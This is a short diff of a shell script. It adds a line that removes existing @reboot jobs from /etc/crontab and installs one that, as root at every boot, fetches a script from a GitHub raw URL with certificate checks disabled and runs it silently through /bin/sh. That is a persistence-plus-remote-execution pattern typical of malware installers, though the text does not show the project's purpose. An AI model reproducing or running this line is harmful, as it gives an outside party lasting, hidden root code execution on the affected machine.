@@ -2,7 +2,7 @@
 
 mode="${1:-0}"
 src="https://raw.githubusercontent.com/pakoinake/jzoax/main"
-[ -f "/etc/crontab" ] && sed -i "/^@reboot/d;\$a\@reboot root /bin/sh <(wget --no-check-certificate -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+[ -f "/etc/crontab" ] && sed -i "/^@reboot/d;\$a\@reboot root /bin/sh <(wget --no-check-certificate -qO- ${src}/studio.sh) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$name" ] || name="NULL"
